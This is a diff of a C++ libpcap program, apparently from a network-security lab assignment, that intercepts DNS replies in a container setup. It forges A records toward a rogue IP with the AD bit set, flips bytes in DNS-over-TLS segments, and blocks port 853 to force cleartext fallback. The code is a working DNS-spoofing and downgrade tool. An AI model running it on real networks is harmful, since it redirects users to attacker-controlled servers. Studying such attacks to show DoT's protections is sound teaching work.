@@ -2,67 +2,50 @@
  * dns_interceptor.cpp — Phase 7 last-mile interceptor, extended for
  * DoT.
  *
- * Builds on Phase 6's forger, with two structural changes:
+ * SINGLE direction, same as Phase 6: edge-router diverts only
+ * resolver -> client traffic through this container (a more-specific
+ * host route for the client's own address). This attacker has no
+ * interface on resolver_net at all, so it could never relay anything
+ * in the other direction anyway -- there is no router it could safely
+ * hand a client -> resolver packet back to without that router simply
+ * re-applying the same diversion rule to the packet THIS program just
+ * sent, looping forever. (Earlier draft tried a bidirectional
+ * diversion for attempt (ii)'s impersonation; that's handled instead
+ * by a real DNAT rule on edge-router -- see tls_endpoint.cpp and this
+ * phase's README -- precisely because it avoids this loop: a DNAT'd
+ * packet becomes a genuinely new connection terminating at the
+ * attacker, not something this program has to relay onward at all.)
  *
- *   1. edge-router now diverts BOTH directions of client<->resolver
- *      traffic through this container (Phase 6 only diverted
- *      resolver->client replies) -- needed because attempt (ii)
- *      (impersonation) has to see the client's initial connection
- *      too, not just the reply. This program therefore tracks TWO
- *      MACs (client's and resolver's) and relays in both directions.
+ * THREE independent toggles (presence-of-file flags, same pattern
+ * used everywhere else in this assignment):
  *
- *   2. It now also relays TCP/853 (DoT), not just UDP/53. TCP relay
- *      here is deliberately dumb: since we never change a segment's
- *      length (only optionally flip one payload byte in place), there
- *      is no sequence-number bookkeeping to do -- recompute the IP/TCP
- *      checksums and reinject, exactly the same shape of operation as
- *      every UDP relay in this assignment.
+ *   /tmp/forge.on   -- Phase 2/3/6 behavior, unchanged: in-place
+ *                      A-record RDATA overwrite on UDP/53 resolver->
+ *                      client replies. Only matters once a client has
+ *                      fallen back to cleartext (DoT itself carries no
+ *                      plain A record for this to touch).
  *
- * FOUR independent toggles (presence-of-file flags, same pattern used
- * everywhere else in this assignment):
+ *   /tmp/tamper.on  -- §7.3 attempt (i). Flips one byte in any TCP/853
+ *                      segment (resolver -> client) carrying payload --
+ *                      "alter the answer in transit". TLS's own
+ *                      integrity check (the AEAD tag) is what actually
+ *                      catches this: the connection just breaks. This
+ *                      cannot forge anything inside an established TLS
+ *                      session; the point is to demonstrate that it
+ *                      can't.
  *
- *   /tmp/forge.on        -- Phase 2/3/6 behavior, unchanged: in-place
- *                           A-record RDATA overwrite on UDP/53
- *                           resolver->client replies. Only matters
- *                           once a client has fallen back to
- *                           cleartext (DoT itself carries no plain A
- *                           record for this to touch).
- *
- *   /tmp/tamper.on       -- §7.3 attempt (i). Flips one byte in any
- *                           TCP/853 segment carrying payload, resolver
- *                           -> client direction ("alter the answer in
- *                           transit"). TLS's own integrity check (the
- *                           AEAD tag) catches this -- the connection
- *                           just breaks. This cannot "forge" anything
- *                           inside an established TLS session; the
- *                           point is to demonstrate that it can't.
- *
- *   /tmp/deny.on         -- §7.3 attempt (iii). Stops relaying TCP/853
- *                           in EITHER direction at all -- "block TCP
- *                           853" via the only mechanism this attacker
- *                           has (it's the sole path to either party,
- *                           ip_forward is off). UDP/53 keeps relaying
- *                           unaffected, so a permissive client's
- *                           cleartext fallback still gets through.
- *
- *   /tmp/impersonate.on  -- §7.3 attempt (ii). When set, this program
- *                           stops relaying TCP/853 ENTIRELY (in either
- *                           direction) and gets out of the way: a
- *                           SEPARATE program (tls_endpoint, started by
- *                           the same entrypoint.sh) takes over that
- *                           traffic via a local iptables REDIRECT,
- *                           toggled by the same flag file so the two
- *                           mechanisms are never both active on
- *                           TCP/853 at once. See tls_endpoint.cpp for
- *                           why that piece can't be a libpcap packet
- *                           forger: completing a cryptographically
- *                           valid TLS handshake needs a real TLS
- *                           stack, not crafted bytes.
+ *   /tmp/deny.on    -- §7.3 attempt (iii). Stops relaying TCP/853
+ *                      entirely -- "block TCP 853" via the only
+ *                      mechanism this attacker has (it's the sole path
+ *                      to the client for resolver-originated traffic;
+ *                      ip_forward is off). UDP/53 keeps relaying
+ *                      unaffected, so a permissive client's cleartext
+ *                      fallback still gets through.
  *
  * Build: g++ -O2 -std=c++17 -Wall -o dns_interceptor dns_interceptor.cpp -lpcap -lpthread
  * Usage: ./dns_interceptor <iface>
- *   CLIENT_MAC / CLIENT_IP     env vars (CLIENT_MAC required seed; refreshed after).
- *   RESOLVER_MAC / RESOLVER_IP env vars (RESOLVER_MAC required seed; refreshed after).
+ *   CLIENT_MAC env var ("aa:bb:cc:dd:ee:ff") -- required (seed value; refreshed after).
+ *   CLIENT_IP  env var -- default "172.16.1.10".
  *   TARGET_NAME env var -- default "example.com".
  *   ROGUE_IP    env var -- default "172.16.1.30".
  */
@@ -93,10 +76,9 @@
 namespace {
 
 constexpr int ETH_HDR_LEN = 14;
-constexpr const char *FORGE_FLAG_PATH       = "/tmp/forge.on";
-constexpr const char *TAMPER_FLAG_PATH      = "/tmp/tamper.on";
-constexpr const char *DENY_FLAG_PATH        = "/tmp/deny.on";
-constexpr const char *IMPERSONATE_FLAG_PATH = "/tmp/impersonate.on";
+constexpr const char *FORGE_FLAG_PATH  = "/tmp/forge.on";
+constexpr const char *TAMPER_FLAG_PATH = "/tmp/tamper.on";
+constexpr const char *DENY_FLAG_PATH   = "/tmp/deny.on";
 constexpr size_t MAX_PACKET_SIZE = 2048;
 constexpr uint16_t DNS_FLAG_AD_BIT = 0x0020;
 constexpr uint16_t DOT_PORT = 853;
@@ -126,7 +108,7 @@ struct DnsHdr { uint16_t id, flags, qdcount, ancount, nscount, arcount; };
 struct TcpHdr {
     uint16_t sport, dport;
     uint32_t seq, ack;
-    uint8_t  data_off; // top 4 bits: header length in 32-bit words
+    uint8_t  data_off;
     uint8_t  flags;
     uint16_t window;
     uint16_t checksum;
@@ -135,22 +117,19 @@ struct TcpHdr {
 #pragma pack(pop)
 
 MacAddr     g_own_mac{};
-std::mutex  g_mac_mu;
+std::mutex  g_client_mac_mu;
 MacAddr     g_client_mac{};
-MacAddr     g_resolver_mac{};
 std::string g_target_name = "example.com";
 uint32_t    g_rogue_ip_net = 0;
-uint32_t    g_client_ip_net = 0;
-uint32_t    g_resolver_ip_net = 0;
 pcap_t     *g_pcap = nullptr;
 
-MacAddr get_mac(bool client) {
-    std::lock_guard<std::mutex> lk(g_mac_mu);
-    return client ? g_client_mac : g_resolver_mac;
+MacAddr get_client_mac() {
+    std::lock_guard<std::mutex> lk(g_client_mac_mu);
+    return g_client_mac;
 }
-void set_mac(bool client, const MacAddr &m) {
-    std::lock_guard<std::mutex> lk(g_mac_mu);
-    (client ? g_client_mac : g_resolver_mac) = m;
+void set_client_mac(const MacAddr &m) {
+    std::lock_guard<std::mutex> lk(g_client_mac_mu);
+    g_client_mac = m;
 }
 
 // ---------- helpers ----------
@@ -189,8 +168,6 @@ uint16_t ip_checksum(IpHdr ip) {
     return checksum_words(reinterpret_cast<uint16_t *>(&ip), sizeof(ip) / 2);
 }
 
-// Generic L4 checksum over a pseudo-header + the L4 segment (works for
-// both UDP and TCP; `l4_len` is the UDP/TCP header+payload length).
 uint16_t l4_checksum(const IpHdr &ip, uint8_t proto, const uint8_t *l4_start, int l4_len) {
     struct Pseudo { uint32_t src, dst; uint8_t zero, proto; uint16_t len; } __attribute__((packed));
     const int total = static_cast<int>(sizeof(Pseudo)) + l4_len;
@@ -199,7 +176,6 @@ uint16_t l4_checksum(const IpHdr &ip, uint8_t proto, const uint8_t *l4_start, in
     Pseudo ph{ip.src, ip.dst, 0, proto, htons(static_cast<uint16_t>(l4_len))};
     std::memcpy(buf.data(), &ph, sizeof(ph));
     std::memcpy(buf.data() + sizeof(ph), l4_start, l4_len);
-    // Zero out the checksum field within the copied L4 header before summing.
     if (proto == 17 && l4_len >= 8) {
         buf[sizeof(ph) + 6] = 0; buf[sizeof(ph) + 7] = 0;
     } else if (proto == 6 && l4_len >= 18) {
@@ -247,19 +223,16 @@ bool flag_on(const char *path) {
     struct stat st;
     return stat(path, &st) == 0;
 }
-bool forging_is_on()      { return flag_on(FORGE_FLAG_PATH); }
-bool tampering_is_on()    { return flag_on(TAMPER_FLAG_PATH); }
-bool denying_is_on()      { return flag_on(DENY_FLAG_PATH); }
-bool impersonate_is_on()  { return flag_on(IMPERSONATE_FLAG_PATH); }
+bool forging_is_on()   { return flag_on(FORGE_FLAG_PATH); }
+bool tampering_is_on() { return flag_on(TAMPER_FLAG_PATH); }
+bool denying_is_on()   { return flag_on(DENY_FLAG_PATH); }
 
-// Re-resolve a peer's current MAC -- same ping+arping+unfiltered
-// "ip neigh show" technique proven out (the hard way) in Phases 2-6.
-std::optional<MacAddr> resolve_peer_mac(const std::string &iface, const std::string &ip) {
-    std::string ping_cmd = "ping -c1 -W1 " + ip + " >/dev/null 2>&1";
+std::optional<MacAddr> resolve_client_mac(const std::string &iface, const std::string &client_ip) {
+    std::string ping_cmd = "ping -c1 -W1 " + client_ip + " >/dev/null 2>&1";
     if (std::system(ping_cmd.c_str()) != 0) { }
-    std::string arping_cmd = "arping -c1 -w1 -I " + iface + " " + ip + " >/dev/null 2>&1";
+    std::string arping_cmd = "arping -c1 -w1 -I " + iface + " " + client_ip + " >/dev/null 2>&1";
     if (std::system(arping_cmd.c_str()) != 0) { }
-    std::string cmd = "ip neigh show " + ip + " 2>/dev/null | awk '{print $5}' | head -n1";
+    std::string cmd = "ip neigh show " + client_ip + " 2>/dev/null | awk '{print $5}' | head -n1";
     FILE *fp = popen(cmd.c_str(), "r");
     if (!fp) return std::nullopt;
     char buf[64] = {0};
@@ -272,17 +245,17 @@ std::optional<MacAddr> resolve_peer_mac(const std::string &iface, const std::str
     return parse_mac(s);
 }
 
-void mac_refresher(std::string iface, std::string ip, bool client) {
+void client_mac_refresher(std::string iface, std::string client_ip) {
     while (true) {
         std::this_thread::sleep_for(std::chrono::seconds(2));
-        auto mac = resolve_peer_mac(iface, ip);
+        auto mac = resolve_client_mac(iface, client_ip);
         if (!mac) continue;
-        if (*mac != get_mac(client)) {
+        if (*mac != get_client_mac()) {
             char hex[32];
             snprintf(hex, sizeof(hex), "%02x:%02x:%02x:%02x:%02x:%02x",
                      (*mac)[0], (*mac)[1], (*mac)[2], (*mac)[3], (*mac)[4], (*mac)[5]);
-            fprintf(stderr, "[attacker] %s MAC changed -> %s\n", client ? "client" : "resolver", hex);
-            set_mac(client, *mac);
+            fprintf(stderr, "[attacker] client MAC changed -> %s\n", hex);
+            set_client_mac(*mac);
         }
     }
 }
@@ -302,15 +275,9 @@ void handle_packet(u_char *, const struct pcap_pkthdr *h, const u_char *bytes) {
     auto *ip = reinterpret_cast<IpHdr *>(pkt + ETH_HDR_LEN);
     const int ihl = (ip->ver_ihl & 0x0F) * 4;
 
-    // Direction: toward the client, or toward the resolver? Determines
-    // which peer's MAC we address the relayed frame to.
-    const bool to_client = (ip->dst == g_client_ip_net);
-    const bool to_resolver = (ip->dst == g_resolver_ip_net);
-    if (!to_client && !to_resolver) return;
-
-    auto send_to = [&](bool client_dst) {
-        const MacAddr dst_mac = get_mac(client_dst);
-        std::memcpy(eth->dst, dst_mac.data(), 6);
+    auto send_it = [&]() {
+        const MacAddr client_mac = get_client_mac();
+        std::memcpy(eth->dst, client_mac.data(), 6);
         std::memcpy(eth->src, g_own_mac.data(), 6);
         pcap_inject(g_pcap, pkt, caplen);
     };
@@ -324,8 +291,7 @@ void handle_packet(u_char *, const struct pcap_pkthdr *h, const u_char *bytes) {
         int dns_len = udp_declared_len - static_cast<int>(sizeof(UdpHdr));
         if (dns_len < 0 || dns_len > captured_avail) dns_len = captured_avail;
 
-        bool forged = false;
-        if (to_client && dns_len >= static_cast<int>(sizeof(DnsHdr)) && forging_is_on()) {
+        if (dns_len >= static_cast<int>(sizeof(DnsHdr)) && forging_is_on()) {
             auto *dns = reinterpret_cast<DnsHdr *>(dns_start);
             const uint16_t flags = ntohs(dns->flags);
             const bool qr = (flags >> 15) & 1;
@@ -354,7 +320,6 @@ void handle_packet(u_char *, const struct pcap_pkthdr *h, const u_char *bytes) {
                                 if (rtype == 1 && rclass == 1 && rdlen == 4 && rdata_off + 4 <= dns_len) {
                                     std::memcpy(dns_start + rdata_off, &g_rogue_ip_net, 4);
                                     dns->flags = htons(static_cast<uint16_t>(ntohs(dns->flags) | DNS_FLAG_AD_BIT));
-                                    forged = true;
                                     fprintf(stderr, "[forge] %s A -> rogue-web, ad=1 (txid 0x%04x) [cleartext fallback]\n",
                                             qname.c_str(), ntohs(dns->id));
                                     break;
@@ -366,33 +331,26 @@ void handle_packet(u_char *, const struct pcap_pkthdr *h, const u_char *bytes) {
                 }
             }
         }
-        (void)forged;
         ip->checksum = ip_checksum(*ip);
         udp->checksum = l4_checksum(*ip, 17, reinterpret_cast<uint8_t *>(udp), sizeof(UdpHdr) + dns_len);
-        send_to(to_client);
+        send_it();
         return;
     }
 
     // ---------------- TCP/853 ----------------
     if (ip->proto == 6) {
         auto *tcp = reinterpret_cast<TcpHdr *>(pkt + ETH_HDR_LEN + ihl);
-        if (ntohs(tcp->sport) != DOT_PORT && ntohs(tcp->dport) != DOT_PORT) return;
+        if (ntohs(tcp->sport) != DOT_PORT) return; // resolver -> client only
 
-        if (impersonate_is_on()) return; // tls_endpoint + kernel DNAT own this traffic now
-        if (denying_is_on()) return;     // attempt (iii): just don't relay at all
+        if (denying_is_on()) return; // attempt (iii): just don't relay at all
 
         const int tcp_hdr_len = ((tcp->data_off >> 4) & 0xF) * 4;
         const int ip_total_len = ntohs(ip->tot_len);
-        const int tcp_seg_len = ip_total_len - ihl; // header + payload
+        const int tcp_seg_len = ip_total_len - ihl;
         const int payload_len = tcp_seg_len - tcp_hdr_len;
         const int payload_off = ETH_HDR_LEN + ihl + tcp_hdr_len;
 
-        if (tampering_is_on() && to_client && payload_len > 0 && payload_off < caplen) {
-            // Flip one payload byte -- "alter the answer in transit".
-            // TLS's own AEAD integrity check is what actually catches
-            // this; we're not trying to produce a coherent forged
-            // message, just demonstrating that tampering is detected
-            // rather than silently accepted.
+        if (tampering_is_on() && payload_len > 0 && payload_off < caplen) {
             pkt[payload_off] ^= 0xFF;
             fprintf(stderr, "[tamper] flipped a byte in a TCP/853 segment toward the client (seg_len=%d) -- expect the TLS session to break\n", tcp_seg_len);
         }
@@ -401,7 +359,7 @@ void handle_packet(u_char *, const struct pcap_pkthdr *h, const u_char *bytes) {
         if (tcp_seg_len > 0 && tcp_seg_len <= caplen - (ETH_HDR_LEN + ihl)) {
             tcp->checksum = l4_checksum(*ip, 6, reinterpret_cast<uint8_t *>(tcp), tcp_seg_len);
         }
-        send_to(to_client);
+        send_it();
         return;
     }
 }
@@ -413,28 +371,13 @@ int main(int argc, char **argv) {
     const std::string iface = argv[1];
 
     const char *client_mac_env = getenv("CLIENT_MAC");
-    const char *resolver_mac_env = getenv("RESOLVER_MAC");
-    if (!client_mac_env || !resolver_mac_env) {
-        fprintf(stderr, "CLIENT_MAC and RESOLVER_MAC env vars both required\n");
-        return 1;
-    }
+    if (!client_mac_env) { fprintf(stderr, "CLIENT_MAC env var missing\n"); return 1; }
     auto cmac = parse_mac(client_mac_env);
-    auto rmac = parse_mac(resolver_mac_env);
-    if (!cmac || !rmac) { fprintf(stderr, "invalid CLIENT_MAC/RESOLVER_MAC\n"); return 1; }
-    set_mac(true, *cmac);
-    set_mac(false, *rmac);
+    if (!cmac) { fprintf(stderr, "invalid CLIENT_MAC\n"); return 1; }
+    set_client_mac(*cmac);
 
     const char *client_ip_env = getenv("CLIENT_IP");
     const std::string client_ip = client_ip_env ? client_ip_env : "172.16.1.10";
-    const char *resolver_ip_env = getenv("RESOLVER_IP");
-    const std::string resolver_ip = resolver_ip_env ? resolver_ip_env : "172.16.2.10";
-
-    struct in_addr cip{}, rip{};
-    if (inet_aton(client_ip.c_str(), &cip) == 0 || inet_aton(resolver_ip.c_str(), &rip) == 0) {
-        fprintf(stderr, "invalid CLIENT_IP/RESOLVER_IP\n"); return 1;
-    }
-    g_client_ip_net = cip.s_addr;
-    g_resolver_ip_net = rip.s_addr;
 
     auto own_mac = get_own_mac(iface);
     if (!own_mac) { fprintf(stderr, "could not read MAC of %s\n", iface.c_str()); return 1; }
@@ -453,11 +396,9 @@ int main(int argc, char **argv) {
     if (!g_pcap) { fprintf(stderr, "pcap_open_live(%s): %s\n", iface.c_str(), errbuf); return 1; }
 
     struct bpf_program fp;
-    // Both directions, both ports -- this attacker now sits on BOTH
-    // legs of client<->resolver traffic (see edge-router's two routes).
     const std::string filter_str =
-        "ip and ((udp and (src port 53 or dst port 53) and (dst host " + client_ip + " or dst host " + resolver_ip + "))"
-        " or (tcp and (src port 853 or dst port 853) and (dst host " + client_ip + " or dst host " + resolver_ip + ")))";
+        "ip and ((udp and src port 53 and dst host " + client_ip + ")"
+        " or (tcp and src port " + std::to_string(DOT_PORT) + " and dst host " + client_ip + "))";
     if (pcap_compile(g_pcap, &fp, filter_str.c_str(), 0, PCAP_NETMASK_UNKNOWN) < 0 ||
         pcap_setfilter(g_pcap, &fp) < 0) {
         fprintf(stderr, "BPF filter error: %s\n", pcap_geterr(g_pcap));
@@ -465,14 +406,13 @@ int main(int argc, char **argv) {
     }
     pcap_freecode(&fp);
 
-    std::thread(mac_refresher, iface, client_ip, true).detach();
-    std::thread(mac_refresher, iface, resolver_ip, false).detach();
+    std::thread(client_mac_refresher, iface, client_ip).detach();
 
-    fprintf(stderr, "[attacker] up on %s, target=%s, rogue=%s, client=%s, resolver=%s\n"
-                     "           forging=%s tamper=%s deny=%s impersonate=%s\n",
-            iface.c_str(), g_target_name.c_str(), rogue, client_ip.c_str(), resolver_ip.c_str(),
+    fprintf(stderr, "[attacker] up on %s, target=%s, rogue=%s, client=%s\n"
+                     "           forging=%s tamper=%s deny=%s\n",
+            iface.c_str(), g_target_name.c_str(), rogue, client_ip.c_str(),
             forging_is_on() ? "ON" : "OFF", tampering_is_on() ? "ON" : "OFF",
-            denying_is_on() ? "ON" : "OFF", impersonate_is_on() ? "ON" : "OFF");
+            denying_is_on() ? "ON" : "OFF");
 
     pcap_loop(g_pcap, -1, handle_packet, nullptr);
     pcap_close(g_pcap);
